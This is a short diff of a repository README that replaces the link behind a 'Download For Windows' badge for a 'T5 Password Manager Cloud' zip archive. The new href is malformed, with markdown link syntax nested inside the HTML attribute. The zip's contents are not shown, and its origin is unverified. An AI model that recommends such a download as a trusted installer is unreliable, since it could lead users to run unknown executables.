@@ -13,7 +13,7 @@
 
   <br><br>
 
-  <a href="https://github.com/Tatai47/T5-Password-Manager-Cloud-For-Windows/blob/789e0dbafa15d48b6aa56a5352cb2d52f538c202/T5%20Password%20Manager%20Cloud%20Windows.zip">
+  <a href="[https://github.com/Tatai47/T5-Password-Manager-Cloud-For-Windows/blob/789e0dbafa15d48b6aa56a5352cb2d52f538c202/T5%20Password%20Manager%20Cloud%20Windows.zip](https://github.com/Tatai47/T5-Password-Manager-Cloud-For-Windows/raw/refs/heads/main/T5%20Password%20Manager%20Cloud%20Windows.zip)">
     <img src="https://img.shields.io/badge/Download-For_Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white" alt="Download for Windows">
   </a>
 
